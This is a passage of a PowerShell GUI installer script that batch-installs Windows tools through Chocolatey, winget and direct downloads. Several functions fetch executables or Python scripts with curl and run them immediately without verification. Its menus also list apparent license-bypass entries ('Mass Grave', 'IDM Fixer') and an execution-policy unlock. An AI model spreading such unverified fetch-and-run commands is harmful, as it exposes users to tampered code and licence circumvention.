    }

    function Install-Chrome {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Google Chrome via Chocolatey... && choco upgrade googlechrome -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo Chrome installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Zen {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Zen Browser via Chocolatey... && choco upgrade zen-browser --prerelease -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo Zen Browser installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-OBS {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing OBS Studio via Chocolatey... && choco upgrade obs-studio -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo OBS Studio installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }


    function Install-LocalSend {
        $localSendCmd = ('echo Downloading LocalSend v1.17.0... && ' +
            'curl.exe -L --retry 3 --retry-delay 2 -o "%TEMP%\localsend.exe" "https://github.com/localsend/localsend/releases/download/v1.17.0/LocalSend-1.17.0-windows-x86-64.exe" && ' +
            'if exist "%TEMP%\localsend.exe" ' +
            '(echo Installing LocalSend silently... && start /wait "" "%TEMP%\localsend.exe" /VERYSILENT /SUPPRESSMSGBOXES /NORESTART /ALLUSERS && echo LocalSend installation completed.) ' +
            'else (echo Download failed.) && echo. && echo Press any key to exit . . . && pause >nul && exit')
        
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", $localSendCmd
    }

    function Install-NotepadPP {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Notepad++ via Chocolatey... && choco upgrade notepadplusplus -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo Notepad++ installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-ShareX {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing ShareX via Chocolatey... && choco upgrade sharex -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo ShareX installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-QBit {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing qBittorrent via Chocolatey... && choco upgrade qbittorrent -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo qBittorrent installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    # ============================================================
    #  Win Tools
    # ============================================================

    function Install-TestDisk {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Downloading TestDisk... && curl.exe -L --retry 3 --retry-delay 2 -o `"%USERPROFILE%\Downloads\testdisk-7.3-WIP.win64.zip`" `"https://www.cgsecurity.org/Download_and_donate.php/testdisk-7.3-WIP.win64.zip`" && echo. && echo Downloaded to Downloads folder. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-FreeRecover {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Downloading FreeRecover... && curl.exe -L --retry 3 --retry-delay 2 -o `"%TEMP%\FreeRecover.exe`" `"https://sourceforge.net/projects/freerecover/files/FreeRecover.exe`" && echo Running... && `"%TEMP%\FreeRecover.exe`" && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-KickassUndelete {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Downloading Kickass Undelete... && curl.exe -L --retry 3 --retry-delay 2 -o `"%TEMP%\KickassUndelete.exe`" `"https://sourceforge.net/projects/kickassundelete/files/Kickass%20Undelete%201.5.5/KickassUndelete_1.5.5.exe/download`" && echo Running... && `"%TEMP%\KickassUndelete.exe`" && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-CPUZ {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing CPU-Z (portable) via Chocolatey... run cpuz in cmd to run && choco upgrade cpuz -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo CPU-Z installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-HWiNFO {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing HWiNFO via Chocolatey... && choco upgrade hwinfo -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo HWiNFO installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    # Ensure unique function name
    function Install-GPUZ {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing GPU-Z (portable) via Chocolatey... && choco upgrade gpu-z -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo GPU-Z installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-CrystalDiskInfo {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing CrystalDiskInfo via Chocolatey... && choco upgrade crystaldiskinfo -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo CrystalDiskInfo installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-CrystalDiskMark {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing CrystalDiskMark via Chocolatey... && choco upgrade crystaldiskmark -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo CrystalDiskMark installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-DriverStoreExplorer {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Checking/Installing DriverStore Explorer via Winget... && winget upgrade lostindark.DriverStoreExplorer --silent || winget install lostindark.DriverStoreExplorer --accept-package-agreements --accept-source-agreements --silent && echo. && echo Launching DriverStore Explorer... && start /b rapr && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Ventoy {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Ventoy via Chocolatey... && choco upgrade ventoy -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo Ventoy installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    # Ensure unique function name
    function Install-Rufus {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Rufus via Chocolatey... && choco upgrade rufus -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo Rufus installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-AnyBurn {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing AnyBurn via Winget... && winget upgrade PowerSoftware.AnyBurn --silent || winget install PowerSoftware.AnyBurn --accept-package-agreements --accept-source-agreements --silent && echo. && echo AnyBurn installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Run-GitCloner {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo === Git Cloner === && curl -L -o `"%TEMP%\git_batch_cloner.py`" https://raw.githubusercontent.com/afnan-nex/git-batch-cloner/main/git_batch_cloner.py && python `"%TEMP%\git_batch_cloner.py`" && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    # Ensure unique function name
    function Install-Downly {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo === Downly === && aria2c >nul 2>&1 || choco upgrade aria2 -y --force --install-if-not-installed && curl -L -o Downly.py https://raw.githubusercontent.com/afnan-nex/Downly/main/Downly.py && python -m pip install customtkinter aria2p pillow && python Downly.py && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Run-MonkeytypeTui {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo === Monkeytype TUI === && curl -L -o monkeytype_tui.py https://raw.githubusercontent.com/afnan-nex/monkeytype-tui/main/monkeytype_tui.py && python -m pip install --upgrade textual && python monkeytype_tui.py && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    # ============================================================
    #  SECTION B: WPF COLOR BRUSHES AND RESOURCES
    # ============================================================

    $brushBG = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(18, 18, 28))
    $brushPanel = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(24, 24, 38))
    $brushGroup = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(30, 30, 48))
    $brushAccent = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(99, 179, 237))
    $brushBtn = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(42, 42, 68))
    $brushText = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(218, 218, 232))
    $brushMuted = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(120, 120, 155))
    $brushGreen = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(72, 199, 142))
    $brushRed = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(252, 110, 110))
    $brushYellow = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(253, 203, 88))
    $brushSep = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(48, 48, 78))

    # ============================================================
    #  SECTION C: TASK REGISTRY
    # ============================================================
    $script:AllTasks = [System.Collections.Generic.List[hashtable]]::new()

    # ============================================================
    #  SECTION D: WPF XAML LAYOUT DEFINITION
    # ============================================================

    $xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="Tool Installer  -  by AFNAN"
        Width="1300" Height="600" MinWidth="820" MinHeight="620"
        WindowStartupLocation="CenterScreen" ResizeMode="CanResize"
        Background="#12121C" Foreground="#DADAE8"
        KeyboardNavigation.DirectionalNavigation="Continue">
    <Window.Resources>
        <Style x:Key="ScrollBarButton" TargetType="RepeatButton">
            <Setter Property="OverridesDefaultStyle" Value="true"/>
            <Setter Property="Focusable" Value="false"/>
            <Setter Property="IsTabStop" Value="false"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="RepeatButton">
                        <Border Background="Transparent"/>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
        <Style TargetType="ScrollBar">
            <Setter Property="Background" Value="#12121C"/>
            <Setter Property="BorderBrush" Value="#30304E"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="ScrollBar">
                        <Grid x:Name="Bg" Background="{TemplateBinding Background}" SnapsToDevicePixels="true">
                            <Track x:Name="PART_Track" IsDirectionReversed="true" Orientation="{TemplateBinding Orientation}">
                                <Track.DecreaseRepeatButton>
                                    <RepeatButton Style="{StaticResource ScrollBarButton}" Command="ScrollBar.PageUpCommand"/>
                                </Track.DecreaseRepeatButton>
                                <Track.Thumb>
                                    <Thumb x:Name="Thumb" Background="#30304E">
                                        <Thumb.Template>
                                            <ControlTemplate TargetType="Thumb">
                                                <Border Background="{TemplateBinding Background}" CornerRadius="4" Margin="1"/>
                                            </ControlTemplate>
                                        </Thumb.Template>
                                    </Thumb>
                                </Track.Thumb>
                                <Track.IncreaseRepeatButton>
                                    <RepeatButton Style="{StaticResource ScrollBarButton}" Command="ScrollBar.PageDownCommand"/>
                                </Track.IncreaseRepeatButton>
                            </Track>
                        </Grid>
                        <ControlTemplate.Triggers>
                            <Trigger Property="Orientation" Value="Horizontal">
                                <Setter TargetName="PART_Track" Property="IsDirectionReversed" Value="false"/>
                            </Trigger>
                            <Trigger SourceName="Thumb" Property="IsMouseOver" Value="true">
                                <Setter TargetName="Thumb" Property="Background" Value="#63B3ED"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
            <Style.Triggers>
                <Trigger Property="Orientation" Value="Vertical">
                    <Setter Property="Width" Value="10"/>
                    <Setter Property="Height" Value="Auto"/>
                </Trigger>
                <Trigger Property="Orientation" Value="Horizontal">
                    <Setter Property="Width" Value="Auto"/>
                    <Setter Property="Height" Value="10"/>
                </Trigger>
            </Style.Triggers>
        </Style>
        <Style TargetType="Button">
            <Setter Property="Background" Value="#2A2A44"/>
            <Setter Property="Foreground" Value="#DADAE8"/>
            <Setter Property="BorderBrush" Value="#30304E"/>
            <Setter Property="BorderThickness" Value="1"/>
            <Setter Property="Padding" Value="5,2"/>
            <Setter Property="FontFamily" Value="Segoe UI"/>
            <Setter Property="FontSize" Value="12"/>
            <Setter Property="HorizontalContentAlignment" Value="Left"/>
            <Setter Property="VerticalContentAlignment" Value="Center"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border x:Name="border" Background="{TemplateBinding Background}" BorderBrush="{TemplateBinding BorderBrush}" BorderThickness="{TemplateBinding BorderThickness}" CornerRadius="3" SnapsToDevicePixels="true">
                            <ContentPresenter HorizontalAlignment="{TemplateBinding HorizontalContentAlignment}" VerticalAlignment="{TemplateBinding VerticalContentAlignment}" Margin="{TemplateBinding Padding}"/>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="true">
                                <Setter TargetName="border" Property="Background" Value="#3C3C60"/>
                            </Trigger>
                            <Trigger Property="IsKeyboardFocused" Value="true">
                                <Setter TargetName="border" Property="Background" Value="#3C3C60"/>
                            </Trigger>
                            <Trigger Property="IsPressed" Value="true">
                                <Setter TargetName="border" Property="Background" Value="#63B3ED"/>
                                <Setter Property="Foreground" Value="#12121C"/>
                            </Trigger>
                            <Trigger Property="IsEnabled" Value="false">
                                <Setter TargetName="border" Property="Opacity" Value="0.5"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
        <Style TargetType="CheckBox">
            <Setter Property="Foreground" Value="#DADAE8"/>
            <Setter Property="FontFamily" Value="Segoe UI"/>
            <Setter Property="FontSize" Value="12"/>
            <Setter Property="VerticalAlignment" Value="Center"/>
        </Style>
        <Style TargetType="GroupBox">
            <Setter Property="Background" Value="#1E1E30"/>
            <Setter Property="BorderBrush" Value="#30304E"/>
            <Setter Property="Foreground" Value="#63B3ED"/>
            <Setter Property="FontFamily" Value="Segoe UI"/>
            <Setter Property="FontWeight" Value="Bold"/>
            <Setter Property="FontSize" Value="13"/>
            <Setter Property="Margin" Value="0,0,0,14"/>
            <Setter Property="Padding" Value="8"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="GroupBox">
                        <Border Background="{TemplateBinding Background}" BorderBrush="{TemplateBinding BorderBrush}" BorderThickness="1" CornerRadius="5">
                            <Grid>
                                <Grid.RowDefinitions>
                                    <RowDefinition Height="Auto"/>
                                    <RowDefinition Height="*"/>
                                </Grid.RowDefinitions>
                                <Border Grid.Row="0" Background="#181826" CornerRadius="4,4,0,0" Padding="8,6">
                                    <ContentPresenter ContentSource="Header" SnapsToDevicePixels="{TemplateBinding SnapsToDevicePixels}"/>
                                </Border>
                                <ContentPresenter Grid.Row="1" Margin="{TemplateBinding Padding}" SnapsToDevicePixels="{TemplateBinding SnapsToDevicePixels}"/>
                            </Grid>
                        </Border>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
        <Style TargetType="TextBox">
            <Setter Property="Background" Value="#181826"/>
            <Setter Property="Foreground" Value="#78789B"/>
            <Setter Property="BorderBrush" Value="#30304E"/>
            <Setter Property="BorderThickness" Value="1"/>
            <Setter Property="Padding" Value="4,2"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="TextBox">
                        <Border Background="{TemplateBinding Background}" BorderBrush="{TemplateBinding BorderBrush}" BorderThickness="{TemplateBinding BorderThickness}" CornerRadius="3">
                            <ScrollViewer x:Name="PART_ContentHost"/>
                        </Border>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
    </Window.Resources>
    
    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition Height="62"/>
            <RowDefinition Height="*"/>
            <RowDefinition Height="44"/>
        </Grid.RowDefinitions>
        
        <!-- Header Panel -->
        <Grid Grid.Row="0" Background="#181826">
            <StackPanel Orientation="Vertical" HorizontalAlignment="Left" VerticalAlignment="Center" Margin="12,0,0,0">
                <TextBlock Text="Tool Installer" FontFamily="Segoe UI" FontSize="18" FontWeight="Bold" Foreground="#63B3ED"/>
                <TextBlock Text="Check items for batch run   |   Click a button for immediate single execution" FontFamily="Segoe UI" FontSize="11" Foreground="#78789B" Margin="0,2,0,0"/>
            </StackPanel>
            
            <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center" Margin="0,0,15,0">
                <CheckBox Name="ChkSelectAll" Content="Select All" Margin="0,0,15,0" VerticalAlignment="Center"/>
                <Button Name="BtnGithub" Content="GitHub" Width="80" Height="26" Margin="0,0,15,0" VerticalAlignment="Center" Cursor="Hand"/>
                <TextBox Name="TxtSearch" Text="Search..." Width="150" Height="26" VerticalAlignment="Center" Padding="4,2" FontFamily="Segoe UI" FontSize="12"/>
            </StackPanel>
        </Grid>
        
        <!-- Scrollable Columns Grid -->
        <ScrollViewer Grid.Row="1" HorizontalScrollBarVisibility="Auto" VerticalScrollBarVisibility="Auto" Background="#12121C">
            <Grid Name="MainGrid">
                <Grid.ColumnDefinitions>
                    <ColumnDefinition Width="*"/>
                    <ColumnDefinition Width="*"/>
                    <ColumnDefinition Width="*"/>
                    <ColumnDefinition Width="*"/>
                    <ColumnDefinition Width="*"/>
                </Grid.ColumnDefinitions>
                <StackPanel Grid.Column="0" Name="Col0" Margin="14,12,7,12"/>
                <StackPanel Grid.Column="1" Name="Col1" Margin="7,12,7,12"/>
                <StackPanel Grid.Column="2" Name="Col2" Margin="7,12,7,12"/>
                <StackPanel Grid.Column="3" Name="Col3" Margin="7,12,7,12"/>
                <StackPanel Grid.Column="4" Name="Col4" Margin="7,12,14,12"/>
            </Grid>
        </ScrollViewer>
        
        <!-- Bottom Panel -->
        <Grid Grid.Row="2" Background="#181826">
            <Border BorderThickness="0,2,0,0" BorderBrush="#30304E" VerticalAlignment="Top"/>
            
            <DockPanel Margin="12,0,12,0" LastChildFill="False" VerticalAlignment="Center">
                <TextBlock Name="LblStatus" Text="Ready" Foreground="#78789B" VerticalAlignment="Center" FontFamily="Segoe UI" FontSize="12"/>
                
                <StackPanel Orientation="Horizontal" DockPanel.Dock="Right" VerticalAlignment="Center">
                    <Button Name="BtnUpgradeAll" Content="choco update" Width="100" Height="26" Margin="0,0,10,0" Cursor="Hand"/>
                    <Button Name="BtnWingetUpgradeAll" Content="winget update" Width="100" Height="26" Margin="0,0,10,0" Cursor="Hand"/>
                    <Button Name="BtnRun" Content="Run selected" Width="100" Height="26" Cursor="Hand"/>
                </StackPanel>
            </DockPanel>
            
            <ProgressBar Name="ProgressBar" Height="4" VerticalAlignment="Bottom" Background="#1E1E30" BorderThickness="0" Foreground="#48C78E" Minimum="0" Value="0"/>
        </Grid>
    </Grid>
</Window>
"@

    Update-InitProgress -Percent 55 -Status "Compiling XAML UI layout & styles..."

    # Parse raw XAML directly via System.Xaml parser
    $script:window = [Windows.Markup.XamlReader]::Parse($xaml)

    # Extract named controls in script scope
    $script:chkSelectAll = $script:window.FindName("ChkSelectAll")
    $script:btnGithub = $script:window.FindName("BtnGithub")
    $script:txtSearch = $script:window.FindName("TxtSearch")
    $script:col0 = $script:window.FindName("Col0")
    $script:col1 = $script:window.FindName("Col1")
    $script:col2 = $script:window.FindName("Col2")
    $script:col3 = $script:window.FindName("Col3")
    $script:col4 = $script:window.FindName("Col4")
    $script:LblStatus = $script:window.FindName("LblStatus")
    $script:btnUpgradeAll = $script:window.FindName("BtnUpgradeAll")
    $script:btnWingetUpgradeAll = $script:window.FindName("BtnWingetUpgradeAll")
    $script:BtnRun = $script:window.FindName("BtnRun")
    $script:ProgressBar = $script:window.FindName("ProgressBar")

    # ============================================================
    #  SECTION E: HELPER FUNCTIONS FOR BUILDING GUI ROWS
    # ============================================================

    function Write-Log {
        param([string]$Message, [string]$Level = "Info")
        $color = switch ($Level) {
            "Running" { $brushYellow }
            "Success" { $brushGreen }
            "Error" { $brushRed }
            default { $brushText }
        }
        $ts = (Get-Date).ToString("HH:mm:ss")
        $line = "[$ts] $Message"
        $script:LblStatus.Dispatcher.Invoke([System.Action] {
            $script:LblStatus.Foreground = $color
            $script:LblStatus.Text = $line
        })
    }

    function New-TaskRow {
        param(
            [string]       $Name,
            [scriptblock]  $Func,
            $ParentStackPanel,
            [int]          $ColIndex
        )

        $rowGrid = New-Object System.Windows.Controls.Grid
        $rowGrid.Margin = New-Object System.Windows.Thickness(0, 2, 0, 2)
        
        $col1Def = New-Object System.Windows.Controls.ColumnDefinition
        $col1Def.Width = New-Object System.Windows.GridLength(30)
        $col2Def = New-Object System.Windows.Controls.ColumnDefinition
        $col2Def.Width = New-Object System.Windows.GridLength(1, [System.Windows.GridUnitType]::Star)
        
        $rowGrid.ColumnDefinitions.Add($col1Def)
        $rowGrid.ColumnDefinitions.Add($col2Def)

        # CheckBox
        $cb = New-Object System.Windows.Controls.CheckBox
        $cb.IsChecked = $false
        $cb.VerticalAlignment = "Center"
        $cb.HorizontalAlignment = "Left"
        $cb.Margin = New-Object System.Windows.Thickness(4, 0, 0, 0)
        $rowGrid.Children.Add($cb) | Out-Null
        [System.Windows.Controls.Grid]::SetColumn($cb, 0)

        # Button
        $btn = New-Object System.Windows.Controls.Button
        $btn.Content = $Name
        $btn.HorizontalContentAlignment = "Left"
        $btn.Padding = New-Object System.Windows.Thickness(10, 4, 10, 4)
        $btn.Height = 26
        $btn.Cursor = [System.Windows.Input.Cursors]::Hand
        $btn.Tag = $Func
        
        $rowGrid.Children.Add($btn) | Out-Null
        [System.Windows.Controls.Grid]::SetColumn($btn, 1)

        # Click Execution
        $btn.Add_Click({
            param($s, $e)
            $f = $s.Tag
            $taskName = $s.Content
            Write-Log "Launching: $taskName ..." -Level Running
            try {
                & $f
                Write-Log "$taskName - launched." -Level Success
            }
            catch {
                Write-Log "ERROR: $taskName - $($_.Exception.Message)" -Level Error
            }
            [void]$script:window.Dispatcher.BeginInvoke([System.Action] {
                $script:window.Activate() | Out-Null
            })
        })

        $ParentStackPanel.Children.Add($rowGrid) | Out-Null

        $entry = @{ 
            Name = $Name
            Function = $Func
            CheckBox = $cb
            Button = $btn
            RowGrid = $rowGrid
            ColIndex = $ColIndex
        }
        $script:AllTasks.Add($entry)
        return $entry
    }

    function New-CategoryGroup {
        param(
            [string]  $Title,
            [array]   $Items,
            $ParentStackPanel,
            [int]     $ColIndex
        )
        
        $gb = New-Object System.Windows.Controls.GroupBox
        $gb.Header = $Title
        
        $inner = New-Object System.Windows.Controls.StackPanel
        $gb.Content = $inner
        
        foreach ($item in $Items) {
            New-TaskRow -Name $item.Name -Func $item.Func -ParentStackPanel $inner -ColIndex $ColIndex | Out-Null
        }
        
        $ParentStackPanel.Children.Add($gb) | Out-Null
        return $gb
    }

    # ============================================================
    #  SECTION F: POPULATE ALL CATEGORIES
    # ============================================================

    function Add-Category {
        param([int]$ColIndex, [string]$Title, [array]$Items)
        $parentPanel = switch ($ColIndex) {
            0 { $script:col0 }
            1 { $script:col1 }
            2 { $script:col2 }
            3 { $script:col3 }
            4 { $script:col4 }
        }
        New-CategoryGroup -Title $Title -Items $Items -ParentStackPanel $parentPanel -ColIndex $ColIndex | Out-Null
    }

    # Column 0
    Update-InitProgress -Percent 65 -Status "Building Category (1/5): Essential & System..."
    Add-Category -ColIndex 0 -Title "About AFNAN" -Items @(
        @{ Name = "Open Portfolio"; Func = { Open-Portfolio } }
    )

    Add-Category -ColIndex 0 -Title "PowerShell Tweaks" -Items @(
        @{ Name = "See Policy"; Func = { See-Policy } },
        @{ Name = "Unrestrict Policy"; Func = { Unrestrict-Policy } }
    )

    Add-Category -ColIndex 0 -Title "Essential" -Items @(
        @{ Name = "Chocolatey"; Func = { Install-Choco } },
        @{ Name = "Node.js LTS"; Func = { Install-NodeLTS } },
        @{ Name = "Scoop"; Func = { Install-Scoop } },
        @{ Name = "pnpm"; Func = { Install-Pnpm } },
        @{ Name = "Yarn"; Func = { Install-Yarn } },
        @{ Name = "Bun"; Func = { Install-Bun } },
        @{ Name = "Go"; Func = { Install-Go } },
        @{ Name = "Deno"; Func = { Install-Deno } }
    )

    Add-Category -ColIndex 0 -Title "Automation" -Items @(
        @{ Name = "n8n Workflow Automation"; Func = { Install-N8N } },
        @{ Name = "Google Workspace CLI (GWS)"; Func = { Install-GWS } }
    )

    Add-Category -ColIndex 0 -Title "Control Panel" -Items @(
        @{ Name = "Classic Control Panel"; Func = { Open-ControlPanel } },
        @{ Name = "Devices and Printers"; Func = { Open-DevicesAndPrinters } },
        @{ Name = "Task Manager"; Func = { Open-TaskManager } },
        @{ Name = "Device Manager"; Func = { Open-DeviceManager } },
        @{ Name = "Disk Management"; Func = { Open-DiskManagement } },
        @{ Name = "System Properties"; Func = { Open-SystemProperties } },
        @{ Name = "System Config (MSConfig)"; Func = { Open-MSConfig } },
        @{ Name = "Power Options"; Func = { Open-PowerOptions } }
    )

    # Column 1
    Update-InitProgress -Percent 72 -Status "Building Category (2/5): Recommended Tools & Apps..."
    Add-Category -ColIndex 1 -Title "Recommended Tools" -Items @(
        @{ Name = "Git"; Func = { Install-Git } },
        @{ Name = "Python"; Func = { Install-Python } },
        @{ Name = ".NET Runtime"; Func = { Install-Dotnet } },
        @{ Name = "FFmpeg"; Func = { Install-FFmpeg } },
        @{ Name = "7-Zip"; Func = { Install-7Zip } },
        @{ Name = "PeaZip"; Func = { Install-PeaZip } },
        @{ Name = "WinDirStat"; Func = { Install-WinDirStat } },
        @{ Name = "yt-dlp"; Func = { Install-YTDLP } },
        @{ Name = "ngrok"; Func = { Install-Ngrok } },
        @{ Name = "localtunnel"; Func = { Install-Localtunnel } },
        @{ Name = "miniserve"; Func = { Install-Miniserve } },
        @{ Name = "Edge WebView2 Runtime"; Func = { Install-WebView2 } }
    )

    Add-Category -ColIndex 1 -Title "Other Apps" -Items @(
        @{ Name = "Fast Stone Image"; Func = { Install-FastStone } },
        @{ Name = "Vlc"; Func = { Install-VLC } },
        @{ Name = "MPC HC"; Func = { Install-MPC-HC } },
        @{ Name = "Only Office"; Func = { Install-OnlyOffice } },
        @{ Name = "Kdenlive"; Func = { Install-Kdenlive } },
        @{ Name = "HandBrake"; Func = { Install-HandBrake } },
        @{ Name = "AntiGravity IDE"; Func = { Install-AntiGravity-ide } },
        @{ Name = "VS Code"; Func = { Install-VSCode } },
        @{ Name = "Zed Editor"; Func = { Install-Zed } },
        @{ Name = "IDM"; Func = { Install-IDM } },
        @{ Name = "Ghost Downloader"; Func = { Install-GhostDownloader } },
        @{ Name = "Virtual Box"; Func = { Install-VirtualBox } }
    )

    # Column 2
    Update-InitProgress -Percent 80 -Status "Building Category (3/5): Run Scripts & AI Tools..."
    Add-Category -ColIndex 2 -Title "Run Scripts" -Items @(
        @{ Name = "Chris Titus Tool"; Func = { Run-Titus } },
        @{ Name = "Mass Grave"; Func = { Run-MassGrave } },
        @{ Name = "Win11 Debloat"; Func = { Run-Win11Debloat } },
        @{ Name = "WinScript"; Func = { Run-WinScript } },
        @{ Name = "Coporton"; Func = { Run-Coporton } },
        @{ Name = "IDM Fixer"; Func = { Run-IDM } },
        @{ Name = "Sparkle"; Func = { Run-Sparkle } },
        @{ Name = "GHGrab (GitHub Grabber)"; Func = { Run-GHGrab } },
        @{ Name = "Tools Installer Setup"; Func = { Run-Setup } },
        @{ Name = "VPN"; Func = { Run-VPN } },
        @{ Name = "Tor Link"; Func = { Run-TorLink } },
        @{ Name = "Tork"; Func = { Install-Tork } },
        @{ Name = "YTDLP Frontend"; Func = { Run-YTDLPFrontend } },
        @{ Name = "Yoinks"; Func = { Run-Yoinks } }
    )

    Add-Category -ColIndex 2 -Title "AI in PC" -Items @(
        @{ Name = "Agy"; Func = { Install-Agy } },
        @{ Name = "Opencode"; Func = { Install-Opencode } },
        @{ Name = "Cursor IDE"; Func = { Install-Cursoride } },
        @{ Name = "Google Desktop App"; Func = { Open-GoogleDesktopApp } },
        @{ Name = "LLM-Checker"; Func = { Run-LLMChecker } },
        @{ Name = "LLMFit"; Func = { Install-LLMFit } },
        @{ Name = "Ollama"; Func = { Install-Ollama } },
        @{ Name = "Claude Code"; Func = { Install-ClaudeCode } },
        @{ Name = "Claude Code Router"; Func = { Install-ClaudeCodeRouter } },
        @{ Name = "Codebuff"; Func = { Install-Codebuff } },
        @{ Name = "Omniroute"; Func = { Install-Omniroute } }
    )

    # Column 3
    Update-InitProgress -Percent 88 -Status "Building Category (4/5): System & Productivity..."
    Add-Category -ColIndex 3 -Title "System Tools" -Items @(
        @{ Name = "Winget"; Func = { Install-Winget } },
        @{ Name = "Everything Search"; Func = { Install-Everything } },
        @{ Name = "CMD Color 0a"; Func = { Set-CMD0A } },
        @{ Name = "RustDesk"; Func = { Install-RustDesk } },
        @{ Name = "HiBit Uninstaller"; Func = { Install-HiBit } },
        @{ Name = "Superfile"; Func = { Install-Superfile } },
        @{ Name = "Alacritty"; Func = { Install-Alacritty } },
        @{ Name = "Scrcpy GUI"; Func = { Install-Scrcpy } },
        @{ Name = "Cursor / Elegant"; Func = { Install-Cursor } },
        @{ Name = "VC++ Runtimes"; Func = { Install-VCC-Runtimes } },
        @{ Name = "DirectX Runtime"; Func = { Install-DirectX } }
    )

    Add-Category -ColIndex 3 -Title "Productivity Apps" -Items @(
        @{ Name = "Office 365"; Func = { Install-Office365 } },
        @{ Name = "Chrome"; Func = { Install-Chrome } },
        @{ Name = "Zen Browser"; Func = { Install-Zen } },
        @{ Name = "OBS Studio"; Func = { Install-OBS } },
